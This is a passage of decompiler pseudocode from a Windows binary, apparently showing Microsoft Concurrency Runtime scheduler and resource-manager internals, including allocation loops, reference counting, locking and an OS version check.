  int v45; // [esp+30h] [ebp-8h]
  unsigned int v46; // [esp+30h] [ebp-8h]
  unsigned int v47; // [esp+34h] [ebp-4h]
  int v48; // [esp+34h] [ebp-4h]

  v2 = a2;
  v4 = 0;
  for ( i = this; v4 < v2; *(_BYTE *)(v7 + 32) = 1 )
  {
    do
    {
      v5 = this[23];
      v6 = *(_DWORD *)(v5 + 4 * v4);
      if ( *(_DWORD *)(v6 + 4) )
        break;
      --v2;
      *(_DWORD *)(v5 + 4 * v4) = *(_DWORD *)(v5 + 4 * v2);
      *(_DWORD *)(this[23] + 4 * v2) = v6;
    }
    while ( v4 < v2 );
    a2 = v2;
    *(_DWORD *)(*(_DWORD *)(this[23] + 4 * v4) + 40) = 0;
    *(_DWORD *)(*(_DWORD *)(this[23] + 4 * v4) + 44) = 0;
    v7 = *(_DWORD *)(this[23] + 4 * v4++);
  }
  v8 = 0;
  for ( j = v2; v8 < v2; ++v8 )
  {
    do
    {
      v9 = *(_DWORD *)(this[23] + 4 * v8);
      if ( *(_DWORD *)(v9 + 40) )
        break;
      v10 = 0;
      if ( this[6] )
      {
        v11 = (_DWORD *)(*(_DWORD *)(*(_DWORD *)(v9 + 16) + 16) + 28);
        do
        {
          if ( *v11 && *v11 < *(v11 - 6) )
          {
            v12 = *(_DWORD *)(this[23] + 4 * v8);
            ++*(_DWORD *)(v12 + 40);
          }
          ++v10;
          v11 += 13;
        }
        while ( v10 < this[6] );
      }
      v13 = this[23];
      v14 = *(_DWORD *)(v13 + 4 * v8);
      if ( !*(_DWORD *)(v14 + 40) )
      {
        --v2;
        *(_DWORD *)(v13 + 4 * v8) = *(_DWORD *)(v13 + 4 * v2);
        *(_DWORD *)(this[23] + 4 * v2) = v14;
      }
    }
    while ( v8 < v2 );
    a2 = v2;
  }
  v15 = 0;
  v43 = 0;
  if ( v2 )
  {
    v44 = this[23];
    do
    {
      v47 = v15;
      v37 = v15 + 1;
      v16 = v15 + 1;
      if ( v15 + 1 < v2 )
      {
        v17 = 4 * v15;
        do
        {
          if ( *(_DWORD *)(*(_DWORD *)(v44 + 4 * v16) + 40) >= *(_DWORD *)(*(_DWORD *)(v17 + v44) + 40) )
          {
            v18 = v47;
          }
          else
          {
            v18 = v16;
            v47 = v16;
            v17 = 4 * v16;
          }
          ++v16;
        }
        while ( v16 < v2 );
        v15 = v43;
        this = i;
        if ( v43 != v18 )
        {
          v19 = i[23];
          v20 = *(_DWORD *)(v19 + 4 * v43);
          *(_DWORD *)(v19 + 4 * v43) = *(_DWORD *)(v19 + 4 * v18);
          *(_DWORD *)(i[23] + 4 * v47) = v20;
        }
      }
      v44 = this[23];
      v21 = *(_DWORD *)(v44 + 4 * v15);
      v22 = *(_DWORD *)(v21 + 16);
      v23 = *(_DWORD *)(v22 + 16);
      v24 = *(_DWORD *)(v22 + 20);
      v48 = v23;
      v25 = 0;
      v40 = 0;
      if ( *(_DWORD *)(v21 + 40) )
      {
        v26 = v24;
        do
        {
          v38 = *(_DWORD *)(v26 + 4 * v25);
          v39 = this[6];
          v27 = v25 + 1;
          v28 = v25 + 1;
          v41 = v25 + 1;
          if ( v25 + 1 < v39 )
          {
            v29 = v48 + 52 * v38;
            v30 = v25;
            v31 = v48;
            do
            {
              v45 = v31 + 52 * *(_DWORD *)(v26 + 4 * v28);
              v32 = *(_DWORD *)(v45 + 28);
              if ( v32 )
              {
                if ( v32 < *(_DWORD *)(v45 + 4) )
                {
                  v33 = *(_DWORD *)(v29 + 28);
                  if ( !v33 || v33 >= *(_DWORD *)(v29 + 4) || *(_DWORD *)(v45 + 28) > v33 )
                  {
                    v29 = v31 + 52 * *(_DWORD *)(v26 + 4 * v28);
                    v30 = v28;
                  }
                }
                v31 = v48;
              }
              ++v28;
            }
            while ( v28 < v39 );
            v34 = v40 == v30;
            v15 = v43;
            v46 = v30;
            this = i;
            if ( !v34 )
            {
              *(_DWORD *)(v26 + 4 * v40) = *(_DWORD *)(v26 + 4 * v46);
              *(_DWORD *)(v26 + 4 * v46) = v38;
            }
            v27 = v41;
          }
          v25 = v27;
          v44 = this[23];
          v40 = v27;
        }
        while ( v27 < *(_DWORD *)(*(_DWORD *)(v44 + 4 * v15) + 40) );
        v2 = a2;
      }
      v15 = v37;
      v43 = v37;
    }
    while ( v37 < v2 );
  }
  return j;
}
// 47287E: conditional instruction was optimized away because %arg_0.4!=0
// 4728CE: conditional instruction was optimized away because esi.4!=0

//----- (00472A77) --------------------------------------------------------
unsigned int __thiscall sub_472A77(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5)
{
  unsigned int v6; // ecx
  unsigned int v7; // esi
  int v9; // edi
  unsigned int v10; // eax
  _DWORD *v11; // ecx
  unsigned int v12; // eax
  unsigned int v13; // ebx
  int v14; // eax
  _DWORD *v15; // edi
  int v16; // ecx
  double v17; // st7
  _DWORD *v18; // esi
  unsigned int v19; // edi
  double v20; // st6
  double v21; // st7
  unsigned int v22; // ecx
  int v23; // eax
  char v24; // dl
  unsigned int v25; // ecx
  double v26; // st7
  double v27; // st6
  double v28; // st6
  unsigned int v29; // eax
  double v30; // st7
  char v31; // dl
  double v32; // st7
  double v33; // st6
  double v34; // st6
  unsigned int v35; // eax
  double v36; // st7
  char v37; // cl
  double v38; // st7
  double v39; // st6
  int v40; // ecx
  int v41; // eax
  _DWORD *v42; // edx
  unsigned int v43; // ecx
  double i; // [esp+4h] [ebp-44h]
  double v46; // [esp+Ch] [ebp-3Ch]
  double v47; // [esp+14h] [ebp-34h]
  int v48; // [esp+20h] [ebp-28h]
  unsigned int v49; // [esp+24h] [ebp-24h]
  _DWORD *v50; // [esp+2Ch] [ebp-1Ch]
  unsigned int v51; // [esp+2Ch] [ebp-1Ch]
  int v52; // [esp+2Ch] [ebp-1Ch]
  unsigned int v53; // [esp+2Ch] [ebp-1Ch]
  _DWORD *v54; // [esp+2Ch] [ebp-1Ch]
  unsigned int v55; // [esp+2Ch] [ebp-1Ch]
  unsigned int v56; // [esp+30h] [ebp-18h]
  int v57; // [esp+30h] [ebp-18h]
  unsigned int v58; // [esp+34h] [ebp-14h]
  unsigned int v59; // [esp+34h] [ebp-14h]
  int v60; // [esp+34h] [ebp-14h]
  unsigned int v61; // [esp+34h] [ebp-14h]
  int v62; // [esp+34h] [ebp-14h]
  int v63; // [esp+38h] [ebp-10h]
  _DWORD *v64; // [esp+38h] [ebp-10h]
  unsigned int v66; // [esp+40h] [ebp-8h]
  char v67; // [esp+47h] [ebp-1h]
  unsigned int v68; // [esp+58h] [ebp+10h]

  v49 = 0;
  v6 = this[2];
  if ( v6 > 1 )
  {
    v7 = 1;
    v9 = this[21] + 4;
    v66 = a3;
    v58 = v6 - 1;
    do
    {
      v50 = *(_DWORD **)(*(_DWORD *)v9 + 16);
      v63 = v50[46];
      v10 = sub_472427(v50);
      v11 = v50;
      v51 = v50[40] - v50[42];
      if ( v51 <= v63 + v10 )
      {
        v12 = v66;
      }
      else
      {
        ++v7;
        a4 += v63 + sub_472427(v11);
        v12 = v51 + v66;
        v66 += v51;
      }
      v9 += 4;
      --v58;
    }
    while ( v58 );
    v68 = a4;
    v13 = 1;
    v59 = v7;
    if ( v7 > 1 && v68 <= v12 )
    {
      v14 = unknown_libname_28((unsigned __int64)v7 >> 30 != 0 ? -1 : 4 * v7);
      v15 = (_DWORD *)v14;
      v64 = (_DWORD *)v14;
      v16 = *(_DWORD *)this[21];
      *(_DWORD *)v14 = v16;
      *(double *)(v16 + 32) = (double)a5;
      v17 = *(double *)(*(_DWORD *)v14 + 32) + 0.0;
      v47 = v17;
      if ( this[2] > 1u )
      {
        v18 = (_DWORD *)(v14 + 4);
        v19 = 1;
        do
        {
          v52 = *(_DWORD *)(*(_DWORD *)(this[21] + 4 * v19) + 16);
          if ( *(_DWORD *)(v52 + 160) - *(_DWORD *)(v52 + 168) <= *(_DWORD *)(v52 + 184) + sub_472427((_DWORD *)v52) )
          {
            v17 = v47;
          }
          else
          {
            *v18++ = v52 + 64;
            v17 = *(double *)(v52 + 96) + v47;
            v47 = v17;
          }
          ++v19;
        }
        while ( v19 < this[2] );
        v7 = v59;
        v15 = v64;
        v13 = 1;
      }
      v20 = (double)v66;
      v46 = v20;
      while ( 1 )
      {
        v21 = v20 / v17;
        v22 = 0;
        for ( i = v21; v22 < v7; *(double *)(v23 + 8) = *(double *)(v23 + 32) * v21 )
          v23 = v15[v22++];
        sub_4735A3((int)v15, v7);
        v24 = 0;
        v67 = 0;
        v25 = 1;
        if ( v7 <= 1 )
          goto LABEL_48;
        do
        {
          v60 = v15[v25];
          v53 = *(_DWORD *)(*(_DWORD *)(v60 + 16) + 160) - *(_DWORD *)(*(_DWORD *)(v60 + 16) + 168);
          v15 = v64;
          if ( *(_DWORD *)(v60 + 4) <= v53 )
          {
            v17 = v47;
          }
          else
          {
            v24 = 1;
            v26 = (double)v53 / (double)*(unsigned int *)(v60 + 4);
            v27 = *(double *)(v60 + 32);
            v47 = v47 - (1.0 - v26) * v27;
            v28 = v26 * v27;
            v17 = v47;
            *(double *)(v60 + 32) = v28;
          }
          ++v25;
        }
        while ( v25 < v7 );
        v20 = v46;
        v67 = v24;
        if ( !v24 )
        {
LABEL_48:
          v29 = 0;
          v56 = 0;
          if ( !v7 )
            goto LABEL_49;
          do
          {
            v48 = v15[v29];
            v54 = *(_DWORD **)(v48 + 16);
            v61 = *(_DWORD *)(v48 + 4);
            if ( v61 <= sub_4707A1(v54) )
            {
              v17 = v47;
              v31 = v67;
            }
            else
            {
              v30 = (double)sub_4707A1(v54);
              v31 = 1;
              v32 = v30 / (double)v61;
              v67 = 1;
              v33 = *(double *)(v48 + 32);
              v47 = v47 - (1.0 - v32) * v33;
              v34 = v32 * v33;
              v17 = v47;
              *(double *)(v48 + 32) = v34;
            }
            v29 = v56 + 1;
            v56 = v29;
          }
          while ( v29 < v7 );
          v20 = v46;
          if ( !v31 )
          {
LABEL_49:
            v35 = 0;
            v55 = 0;
            if ( !v7 )
              break;
            do
            {
              v62 = v15[v35];
              v57 = *(_DWORD *)(*(_DWORD *)(v62 + 16) + 184);
              if ( v57 + sub_472427(*(_DWORD **)(v62 + 16)) <= *(_DWORD *)(v62 + 4) )
              {
                v17 = v47;
                v37 = v67;
              }
              else
              {
                v36 = (double)(v57 + sub_472427(*(_DWORD **)(v62 + 16)));
                v37 = 1;
                v38 = v36 / i;
                v67 = 1;
                v47 = v38 - *(double *)(v62 + 32) + v47;
                v39 = v38;
                v17 = v47;
                *(double *)(v62 + 32) = v39;
              }
              v35 = v55 + 1;
              v55 = v35;
            }
            while ( v35 < v7 );
            v20 = v46;
            if ( !v37 )
              break;
          }
        }
      }
      v40 = *v15;
      if ( *(_DWORD *)(*v15 + 4) > a3 )
      {
        if ( v7 > 1 )
        {
          do
          {
            v41 = v15[v13];
            v42 = *(_DWORD **)(v41 + 16);
            v43 = v42[40] - *(_DWORD *)(v41 + 4) - v42[42];
            if ( v43 )
              sub_472F99(this, a2, v42, v43);
            ++v13;
          }
          while ( v13 < v7 );
          v40 = *v15;
        }
        v49 = sub_473283(this, a2, *(_DWORD *)(v40 + 4) - a3, 0);
      }
      j_j_j___free_base(v15);
    }
  }
  return v49;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (00472E4B) --------------------------------------------------------
signed __int32 __thiscall sub_472E4B(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 1);
}

//----- (00472E55) --------------------------------------------------------
char *__thiscall sub_472E55(void *this, int a2, int a3)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, (int)"pScheduler");
LABEL_6:
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( a3 != 0x10000 )
  {
    sub_46A08B(pExceptionObject, (int)"version");
    goto LABEL_6;
  }
  return sub_470642(this, a2);
}

//----- (00472E99) --------------------------------------------------------
signed __int32 __thiscall sub_472E99(int this)
{
  signed __int32 v2; // ebx

  v2 = _InterlockedDecrement((volatile signed __int32 *)(this + 4));
  if ( !v2 )
  {
    sub_46FC8F(&dword_4F0C34);
    dword_4F0BD0 = sub_46F9E3(dword_4F0BD0) != this ? dword_4F0BD0 : 0;
    dword_4F0C34 = 0;
    if ( *(_DWORD *)(this + 76) )
    {
      sub_46F04D((LPCRITICAL_SECTION)(this + 44));
      *(_DWORD *)(this + 40) = 2;
      sub_46F193((LPCRITICAL_SECTION)(this + 44));
      SetEvent(*(HANDLE *)(this + 80));
      sub_46F98E(*(HANDLE *)(this + 76), 0xFFFFFFFF);
    }
    sub_46FEB6((char *)this);
    sub_46C87D((void *)this);
  }
  return v2;
}
// 4F0BD0: using guessed type int dword_4F0BD0;
// 4F0C34: using guessed type int dword_4F0C34;

//----- (00472F44) --------------------------------------------------------
unsigned int __thiscall sub_472F44(_DWORD *this, int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v5; // edi
  int v6; // ebx
  bool v7; // zf

  v5 = 1;
  v6 = 0;
  if ( this[2] > 1u )
  {
    do
    {
      if ( sub_472F99(this, a2, *(_DWORD **)(*(_DWORD *)(this[21] + 4 * v5) + 16), a4) )
        LOBYTE(v6) = 1;
      ++v5;
    }
    while ( v5 < this[2] );
    v7 = (_BYTE)v6 == 0;
    v6 = 0;
    if ( !v7 )
      return sub_473283(this, a2, a3, 0);
  }
  return v6;
}

//----- (00472F99) --------------------------------------------------------
char __thiscall sub_472F99(_DWORD *this, int a2, _DWORD *a3, unsigned int a4)
{
  unsigned int v4; // edx
  unsigned int v5; // eax
  unsigned int v6; // ebx
  int v7; // edi
  unsigned int v8; // eax
  _DWORD *v9; // ecx
  unsigned int v10; // eax
  int v11; // edi
  int v13; // [esp+Ch] [ebp-18h]
  int v14; // [esp+10h] [ebp-14h]
  _DWORD *v15; // [esp+14h] [ebp-10h]
  unsigned int v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  int v18; // [esp+20h] [ebp-4h]

  v4 = a4;
  v15 = this;
  if ( a4 == -2 )
  {
    v5 = a3[42];
    v4 = v5;
  }
  else
  {
    if ( a4 == -1 )
    {
      v4 = a3[40] - a3[27] - (a3[46] + sub_472427(a3));
      this = v15;
    }
    v5 = 0;
  }
  v6 = v4 - v5;
  if ( !v4 )
    return 0;
  v7 = a3[4];
  v13 = v7;
  v14 = *(_DWORD *)(a2 + 20);
  v8 = 0;
  v16 = 0;
  if ( !this[6] )
    return 0;
  while ( 1 )
  {
    v9 = (_DWORD *)(v7 + 52 * *(_DWORD *)(v14 + 4 * v8));
    if ( v9[7] != v9[9] )
    {
      v10 = 0;
      v18 = 0;
      if ( v9[1] )
        break;
    }
LABEL_21:
    v8 = v16 + 1;
    v16 = v8;
    if ( v8 >= v15[6] )
      return 0;
  }
  v17 = 0;
  while ( 1 )
  {
    v11 = v17 + v9[12];
    if ( *(_DWORD *)v11 != 4 || *(_DWORD *)(v11 + 40) )
      goto LABEL_19;
    if ( *(_BYTE *)(v11 + 49) || v6 )
    {
      *(_DWORD *)v11 = 5;
      ++a3[27];
      --**(_DWORD **)(v11 + 20);
      if ( !*(_BYTE *)(v11 + 49) )
        --v6;
      if ( !--v4 )
        return 1;
    }
    v10 = v18;
LABEL_19:
    v17 += 52;
    v18 = ++v10;
    if ( v10 >= v9[1] )
    {
      v7 = v13;
      goto LABEL_21;
    }
  }
}

//----- (0047308D) --------------------------------------------------------
int __thiscall sub_47308D(_DWORD *this, int a2)
{
  int result; // eax

  --*this;
  *(_DWORD *)(*(_DWORD *)(a2 + 24) + 28) = *(_DWORD *)(a2 + 28);
  *(_DWORD *)(*(_DWORD *)(a2 + 28) + 24) = *(_DWORD *)(a2 + 24);
  result = this[1];
  if ( a2 == result )
  {
    if ( result == *(_DWORD *)(result + 24) )
      result = 0;
    else
      result = *(_DWORD *)(result + 28);
    this[1] = result;
  }
  return result;
}

//----- (004730C3) --------------------------------------------------------
void __thiscall sub_4730C3(int this, DWORD_PTR *a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  _DWORD *v4; // edi
  bool v5; // [esp+14h] [ebp-10h]

  v5 = 0;
  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_46F04D((LPCRITICAL_SECTION)(this + 44));
  v4 = (_DWORD *)a2[5];
  sub_479E7D(a2);
  if ( v4[40] < sub_4707A1(v4) && *(_DWORD *)(this + 8) == 1 )
    v5 = !sub_470B71((_DWORD *)this);
  sub_46F193(v3);
  if ( v5 )
    SetEvent(*(HANDLE *)(this + 80));
}

//----- (0047313A) --------------------------------------------------------
_DWORD *__thiscall sub_47313A(int this, _DWORD *a2, char a3)
{
  struct _RTL_CRITICAL_SECTION *v4; // esi
  _DWORD *v5; // eax
  char v6; // bl
  bool v8; // [esp+14h] [ebp-14h]
  _DWORD *v9; // [esp+18h] [ebp-10h]

  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  v9 = 0;
  v8 = 0;
  sub_46F04D((LPCRITICAL_SECTION)(this + 44));
  if ( a3 )
  {
    v9 = sub_47B489(a2);
    v8 = v9 == 0;
  }
  if ( a2[33] == a2[32] )
    ++*(_DWORD *)(this + 16);
  ++*(_DWORD *)(this + 8);
  sub_470077((_DWORD *)(this + 96), (int)a2);
  v5 = sub_472440((unsigned int *)this, a2, 1, v8);
  if ( !v9 )
    v9 = v5;
  if ( a2[33] == a2[32] )
    sub_47377A((_DWORD *)this, a2);
  if ( *(_DWORD *)(this + 8) == 2 )
  {
    v6 = 0;
    *(_DWORD *)(this + 40) = 1;
    if ( !*(_DWORD *)(this + 76) )
    {
      *(_DWORD *)(this + 76) = 1;
      *(_DWORD *)(this + 88) = unknown_libname_28(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      *(_DWORD *)(this + 92) = unknown_libname_28(
                                 (unsigned __int64)*(unsigned int *)(this + 12) >> 30 != 0
                               ? -1
                               : 4 * *(_DWORD *)(this + 12));
      v6 = 1;
    }
    sub_46F193(v4);
    SetEvent(*(HANDLE *)(this + 80));
    if ( v6 )
      sub_4705DB((_DWORD *)this);
  }
  else
  {
    sub_46F193(v4);
  }
  return v9;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047324F) --------------------------------------------------------
unsigned int __thiscall sub_47324F(_DWORD *this, int a2, unsigned int a3)
{
  int v3; // edi
  unsigned int i; // esi
  unsigned int v5; // eax
  _DWORD *v7; // [esp+8h] [ebp-4h]

  v3 = 0;
  v7 = this;
  for ( i = 0; i < a3; i += v5 )
  {
    v5 = sub_473283(this, a2, a3 - i, ++v3);
    this = v7;
  }
  return i;
}

//----- (00473283) --------------------------------------------------------
unsigned int __thiscall sub_473283(_DWORD *this, int a2, unsigned int a3, int a4)
{
  char v5; // al
  int v6; // esi
  unsigned int v7; // ebx
  unsigned int v8; // edx
  _DWORD *v9; // ecx
  unsigned int v10; // edi
  int v11; // esi
  int v12; // edx
  int v13; // ecx
  unsigned int v14; // edi
  _DWORD *v15; // eax
  unsigned int v16; // ecx
  _DWORD *v17; // edx
  unsigned int v18; // ebx
  unsigned int v19; // esi
  _DWORD *v20; // ecx
  unsigned int v21; // eax
  unsigned int v22; // ecx
  int v23; // edx
  int v24; // eax
  unsigned int v25; // edi
  int v26; // ebx
  int v27; // eax
  int v28; // ecx
  unsigned int v30; // [esp+Ch] [ebp-24h]
  unsigned int v31; // [esp+10h] [ebp-20h]
  int v32; // [esp+10h] [ebp-20h]
  int v33; // [esp+14h] [ebp-1Ch]
  int v35; // [esp+1Ch] [ebp-14h]
  int v36; // [esp+20h] [ebp-10h]
  unsigned int v37; // [esp+24h] [ebp-Ch]
  unsigned int v38; // [esp+28h] [ebp-8h]
  char v39; // [esp+2Fh] [ebp-1h]

  v33 = -1;
  if ( *(_BYTE *)(a2 + 104) )
    v33 = sub_471B12(this, 0);
  v5 = 0;
  v6 = *(_DWORD *)(a2 + 20);
  v7 = 0;
  v8 = this[6];
  v36 = *(_DWORD *)(a2 + 16);
  v35 = v6;
  v39 = 0;
  v31 = 0;
  if ( v8 )
  {
    v9 = (_DWORD *)(*(_DWORD *)(a2 + 16) + 8);
    do
    {
      v10 = 0;
      if ( *(v9 - 1) )
      {
        v11 = 0;
        do
        {
          v12 = v9[10];
          if ( *(_DWORD *)(v12 + v11) == 1 )
          {
            if ( a4 == **(_DWORD **)(v12 + v11 + 20) )
            {
              v5 = 1;
              *(_DWORD *)(v12 + v11) = 2;
              ++*v9;
              v39 = 1;
            }
            else
            {
              v5 = v39;
            }
          }
          ++v10;
          v11 += 52;
        }
        while ( v10 < *(v9 - 1) );
        v7 = v31;
      }
      ++v7;
      v9 += 13;
      v31 = v7;
      v8 = this[6];
    }
    while ( v7 < v8 );
    v6 = v35;
  }
  v13 = 0;
  v37 = 0;
  if ( v5 )
  {
    v14 = 0;
    v32 = 0;
    if ( v8 )
    {
      v15 = this;
      do
      {
        v16 = v14;
        v38 = v14;
        v17 = (_DWORD *)(v36 + 52 * *(_DWORD *)(v6 + 4 * v14));
        v18 = a3 - v37;
        if ( a3 != v37 )
        {
          if ( v17[2] > v18 )
            v17[2] = v18;
          v19 = v14 + 1;
          if ( v14 + 1 < v15[6] )
          {
            while ( 1 )
            {
              v20 = (_DWORD *)(v36 + 52 * *(_DWORD *)(v35 + 4 * v19));
              v30 = v20[2];
              if ( v30 > v18 )
              {
                v20[2] = v18;
                v30 = a3 - v37;
              }
              v21 = v30 + v20[6] + v20[7];
              v22 = v17[2] + v17[6] + v17[7];
              if ( v22 >= v21 )
              {
                if ( v22 != v21 || !*(_BYTE *)(a2 + 104) || (v24 = *(_DWORD *)(v35 + 4 * v19), v24 != v33) )
                {
                  v16 = v38;
                  goto LABEL_32;
                }
                v23 = 52 * v24;
              }
              else
              {
                v23 = 52 * *(_DWORD *)(v35 + 4 * v19);
              }
              v17 = (_DWORD *)(v36 + v23);
              v16 = v19;
              v38 = v19;
LABEL_32:
              if ( ++v19 >= this[6] )
              {
                v14 = v32;
                break;
              }
            }
          }
          v6 = v35;
        }
        if ( v17[2] )
        {
          if ( v17[1] )
          {
            v25 = 0;
            v26 = 0;
            do
            {
              v27 = v26 + v17[12];
              if ( *(_DWORD *)v27 == 2 )
              {
                v16 = v38;
                if ( v37 >= a3 )
                {
                  *(_DWORD *)v27 = 1;
                }
                else
                {
                  *(_DWORD *)v27 = 3;
                  ++**(_DWORD **)(v27 + 20);
                  ++v17[6];
                  if ( *(_BYTE *)(a2 + 104) && *(_DWORD *)(v6 + 4 * v38) == v33 )
                    *(_BYTE *)(a2 + 104) = 0;
                  ++v37;
                }
              }
              ++v25;
              v26 += 52;
            }
            while ( v25 < v17[1] );
            v14 = v32;
          }
          v17[2] = 0;
        }
        if ( v14 != v16 )
        {
          v28 = *(_DWORD *)(v6 + 4 * v14);
          *(_DWORD *)(v6 + 4 * v14) = *(_DWORD *)(v6 + 4 * v38);
          *(_DWORD *)(v6 + 4 * v38) = v28;
        }
        v15 = this;
        v32 = ++v14;
      }
      while ( v14 < this[6] );
      return v37;
    }
  }
  return v13;
}

//----- (0047345E) --------------------------------------------------------
int __thiscall sub_47345E(_DWORD *this)
{
  _DWORD *v1; // esi
  __int64 v2; // rax
  int v3; // edi
  _DWORD *v4; // ecx
  int v5; // ebx
  unsigned int v6; // esi
  _DWORD *v7; // eax

  v1 = this;
  v2 = 0i64;
  if ( this[6] )
  {
    v3 = 0;
    do
    {
      v4 = (_DWORD *)(v3 + v1[18]);
      v4[2] = 0;
      v4[7] = 0;
      if ( v4[1] )
      {
        v5 = 0;
        v6 = 0;
        do
        {
          v7 = (_DWORD *)(v5 + v4[8]);
          v5 += 36;
          *v7 = 0;
          v7[7] = 0;
          ++v6;
        }
        while ( v6 < v4[1] );
        v1 = this;
        LODWORD(v2) = 0;
      }
      ++HIDWORD(v2);
      v3 += 40;
    }
    while ( HIDWORD(v2) < v1[6] );
  }
  return v2;
}

//----- (004734B5) --------------------------------------------------------
__int32 sub_4734B5()
{
  __int32 result; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-124h] BYREF
  struct _OSVERSIONINFOW VersionInformation; // [esp+Ch] [ebp-118h] BYREF

  VersionInformation.dwOSVersionInfoSize = 276;
  if ( !GetVersionExW(&VersionInformation) )
  {
LABEL_20:
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVunsupported_os_Concurrency__);
  }
  if ( VersionInformation.dwMajorVersion != 5 )
  {
    if ( VersionInformation.dwMajorVersion != 6 )
      goto LABEL_9;
    result = VersionInformation.dwMinorVersion;
    if ( !VersionInformation.dwMinorVersion )
    {
      dword_4F0BF4 = 3;
      return result;
    }
    if ( VersionInformation.dwMinorVersion == 1 )
      dword_4F0BF4 = 4;
    else
LABEL_9:
      dword_4F0BF4 = 6;
    goto LABEL_17;
  }
  if ( !VersionInformation.dwMinorVersion )
  {
    dword_4F0BF4 = 0;
    goto LABEL_20;
  }
  if ( VersionInformation.dwMinorVersion == 1 )
  {
    result = 1;
    dword_4F0BF4 = 1;
  }
  else
  {
    result = VersionInformation.dwMinorVersion - 2;
    if ( VersionInformation.dwMinorVersion == 2 )
    {
      dword_4F0BF4 = 2;
      return result;
    }
    result = dword_4F0BF4;
  }
  if ( result >= 4 )
  {
LABEL_17:
    result = sub_46F433();
    if ( dword_4F0BF4 >= 6 )
      return sub_47B80E();
  }
  return result;
}
// 4778F1: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);
// 4F0BF4: using guessed type int dword_4F0BF4;

//----- (004735A3) --------------------------------------------------------
void __cdecl sub_4735A3(int a1, unsigned int a2)
{
  unsigned int v2; // edx
  double v3; // st6
  unsigned int v4; // esi
  int v5; // ecx
  double v6; // st5
  unsigned int v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // edx
  int v10; // esi
  unsigned int v11; // eax
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // esi
  double v15; // st4
  double v16; // rt0
  double v17; // rt1
  double v18; // st4
  double v19; // st6
  double v20; // rt2
  double v21; // st4
  double v22; // st5
  double v23; // rtt
  double v24; // st3
  unsigned int v25; // eax
  unsigned int v26; // esi
  int v27; // edx
  unsigned int v28; // eax
  double v29; // rt2
  int v30; // eax
  double v31; // rtt
  double v32; // st4
  double v33; // rt0
  int v34; // ecx
  unsigned int v35; // [esp+Ch] [ebp-14h]
  unsigned int v36; // [esp+14h] [ebp-Ch]
  unsigned int v37; // [esp+14h] [ebp-Ch]
  unsigned int v38; // [esp+18h] [ebp-8h]
  unsigned int v39; // [esp+1Ch] [ebp-4h]
  unsigned int v40; // [esp+1Ch] [ebp-4h]
  unsigned int v41; // [esp+1Ch] [ebp-4h]

  v2 = 0;
  v3 = 0.0;
  v4 = 0;
  v35 = 0;
  v39 = 0;
  if ( a2 )
  {
    do
    {
      *(_DWORD *)(*(_DWORD *)(a1 + 4 * v4) + 4) = (unsigned __int64)*(double *)(*(_DWORD *)(a1 + 4 * v4) + 8);
      v5 = *(_DWORD *)(a1 + 4 * v39);
      v4 = v39 + 1;
      v39 = v4;
      *(double *)(v5 + 8) = *(double *)(v5 + 8) - (double)*(unsigned int *)(v5 + 4);
    }
    while ( v4 < a2 );
    v2 = 0;
  }
  v6 = 0.0000001;
  v7 = 0;
  v36 = 0;
  if ( a2 )
  {
    do
    {
      v8 = v7 + 1;
      v40 = v7;
      v38 = v7 + 1;
      v9 = v7 + 1;
      if ( v7 + 1 < a2 )
      {
        v10 = 4 * v7;
        do
        {
          if ( *(double *)(*(_DWORD *)(v10 + a1) + 8) + 0.0000001 >= *(double *)(*(_DWORD *)(a1 + 4 * v9) + 8) )
          {
            v11 = v40;
          }
          else
          {
            v11 = v9;
            v40 = v9;
            v10 = 4 * v9;
          }
          ++v9;
        }
        while ( v9 < a2 );
        if ( v36 != v11 )
        {
          v12 = *(_DWORD *)(a1 + 4 * v36);
          *(_DWORD *)(a1 + 4 * v36) = *(_DWORD *)(a1 + 4 * v11);
          *(_DWORD *)(a1 + 4 * v40) = v12;
        }
        v8 = v38;
      }
      v7 = v8;
      v36 = v8;
    }
    while ( v8 < a2 );
    v2 = 0;
  }
  v13 = a2 - 1;
  v14 = 0;
  if ( a2 )
  {
    v15 = 1.0;
    while ( 1 )
    {
      v17 = v15;
      v18 = v3;
      v19 = v17;
      while ( v18 > v6 )
      {
        v20 = v18;
        v21 = v6;
        v22 = v20;
        if ( v21 < *(double *)(*(_DWORD *)(a1 + 4 * v13) + 8) )
        {
          while ( 1 )
          {
            v30 = *(_DWORD *)(a1 + 4 * v13);
            v31 = v21;
            v32 = v22;
            v6 = v31;
            --v13;
            v33 = v32 - *(double *)(v30 + 8);
            *(double *)(v30 + 8) = 0.0;
            v18 = v33;
            if ( v33 <= v31 )
              break;
            v29 = v18;
            v21 = v6;
            v22 = v29;
          }
        }
        else
        {
          --v13;
          v23 = v21;
          v18 = v22;
          v6 = v23;
        }
      }
      if ( v14 > v13 )
        break;
      v24 = *(double *)(*(_DWORD *)(a1 + 4 * v14) + 8);
      if ( v24 > v6 )
      {
        *(double *)(*(_DWORD *)(a1 + 4 * v14) + 8) = 0.0;
        v18 = v18 + v19 - v24;
        ++*(_DWORD *)(*(_DWORD *)(a1 + 4 * v14) + 4);
      }
      if ( ++v14 >= a2 )
        break;
      v16 = v18;
      v15 = v19;
      v3 = v16;
    }
  }
  if ( a2 )
  {
    do
    {
      v25 = v2 + 1;
      v41 = v2;
      v37 = v2 + 1;
